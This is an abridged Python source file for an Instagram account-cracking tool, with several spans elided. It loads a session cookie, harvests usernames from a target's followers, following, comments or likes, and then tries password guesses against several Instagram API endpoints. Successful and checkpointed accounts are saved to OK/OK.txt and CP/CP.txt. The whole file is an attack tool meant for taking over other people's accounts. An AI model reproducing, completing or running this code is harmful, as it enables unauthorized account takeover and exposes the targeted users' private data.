       ...
       try:
           ...
           for yxz in apcb['users']:
               ...
               if xyz not in all_items:
                  ...
                  sys.stdout.write('\r%s[%s!%s] %s%s %sSuccessFully Takens account'%(
...
def LoginCookie():
    print(Banner())
    print(f'\n{N}[{H}!{N}] Please Use New Account For Login')
    ...
    try:
        ...
        with open('data/cookie.txt', mode='w', encoding='utf-8') as wr:
           wr.write(f'{cookie}')
        wr.close()
        print('\n%s[%s!%s] Successfully Login With Accountn %s'%(N,H,N,info))
        quit()
    except Exception as e:exit(e)

def MenuCrack():
    waktu_tersisa = 'Dick On|Unlimited'
    os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls')
    try:
        cookie = open('data/cookie.txt','r').read()
        userid = re.findall('sessionid=(\d+)', str(cookie))[0]
    except (FileNotFoundError,IndexError):
        print('%s[%s!%s] You are not logged in/Incorrect Cookies'%(N,M,N));time.sleep(3);LoginCookie()
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        curl = httpx.get(userinfo.format(**{'id': re.findall('ds_user_id=(\d+)', str(cookie))[0]}), headers=HEADERS)
        info = json.loads(curl.text)['user']['full_name']
        ...
        LoginCookie()
    print(Banner())
    try:print('\n%s[%s!%s] Welcome : %s%s\n%s[%s!%s] Account userid : %s%s\n%s[%s!%s] Remaining time  : %s%s\n%s[%s!%s] Lisense You   : %s%s'%(N,H,N,H,info,N,H,N,H,userid,N,H,N,H,waktu_tersisa.split("|")[1],N,H,N,H,base64.b64encode(waktu_tersisa.split("|")[0].encode()).decode()))
    except IndexError:print('\n%s[%s!%s] Oops, there is an error. Please reconfirm your license'%(N,M,N));time.sleep(3);exit()
    print('''%s
[%s1%s] Crack From List Followers
[%s2%s] Crack From List Following
[%s3%s] Crack From List Comment
[%s4%s] Crack From List Like
[%s5%s] Check Results Crack
[%s0%s] EXIT\n'''%(N,H,N,H,N,H,N,H,N,H,N,H,N,H,N,M,N))
    main = input('[%s?%s] Choose : %s'%(H,N,H))
    if main in   ['1','01']:
       print('\n%s[%s?%s] Want a more target from 1?, Use a comma'%(N,H,N))
       target = input('[%s?%s] Target Name : %s'%(H,N,H))
       pikacu = Get_id(target)
       total  = GetFollowers(pikacu, '', cookie)
       if total is False:exit('\n%s[%s!%s] Upss, it looks like someone is an error, try again..'%(N,M,N))
       else:crack()
    elif main in ['2','02']:
       print('\n%s[%s?%s] Want a more target from 1?, Use a comma'%(N,H,N))
       target = input('[%s?%s] Target Name : %s'%(H,N,H))
       ...
       print('\n%s[%s!%s] Enter the post link, make sure to find a more target from 1/2. Use a comma for separation'%(N,M,N))
       ...
       print('\n%s[%s1%s] Check the account results OK\n[%s2%s] Check the account results CP\n[%s3%s] Back to menu\n'%(N,H,N,H,N,M,N))
       hash = input('%s[%s?%s] Choose : '%(N,H,N))
       if hash in   ['1','01']:
          try:os.system('ul OK/OK.txt')
          except:exit('\n%s[%s!%s] Ups, There was an Error please try again later'%(N,M,N))
       elif hash in ['2','02']:
          try:os.system('ul CP/CP.txt')
          except:exit('\n%s[%s!%s] Ups, There was an Error please try again later'%(N,M,N))
       else:MenuCrack(waktu_tersisa)
    elif main in ['0','00']:
       print('\n%s[%s!%s] There was an Error please try again later? y/t'%(N,K,N))
       date = input('[%s?%s] Wipe Data : %s'%(K,N,M)).lower()
...
def crack():
    print('''\n%s
[%s1%s] Crack Choose Methode (Api, i.instagram.com)
[%s2%s] Crack Choose Methode (Api, www.instagram.com)
[%s3%s] Crack Choose Methode (Api, api.instagram.com)\n'''%(N,H,N,H,N,H,N))
    method = input('[%s?%s] Choose : %s'%(H,N,H))
    apsw(method)

def apsw(method):
    global karangjambu, purbalingga
    print('\n%s[%s?%s] Do You Want to Add a Password to the Crack This Time? (y/t)'%(N,H,N))
    weskas = input('[%s?%s] Choose y/t : %s'%(H,N,H)).lower()
    if weskas in ['y','ya']:
       print('\n%s[%s!%s] Use Commas to Separate Well, for example: bismillah, password'%(N,H,N))
       paswd = input('[%s?%s] Enter Additional Password : %s'%(H,N,H))
    ...
    print('\n%s[%s!%s] Results %sOK %Will be saved in the folder : %sOK/OK.txt\n%s[%s!%s] Results %sCP %Will be saved in the folder : %sCP/CP.txt\n%s[%s!%s] %sWill be saved in the folder 200%s\n'%(
N,H,N,H,N,H,
N,H,N,K,N,K,
N,H,N,K,N))
    ...
    if success == 0 and checkpoint == 0:
       exit('\n%s[%s!%s] Ups, Sorry You Didnt Get Result :('%(N,M,N))
    else:
       exit('\n%s[%s!%s] Hi You Get %s accounts OK and %s accounts CP'%(N,H,N,success,checkpoint))
    quit(0)
...
def convert_cookie(item):
    try:
        ...
        donez = 'cookies not found, error while converting'
    return donez
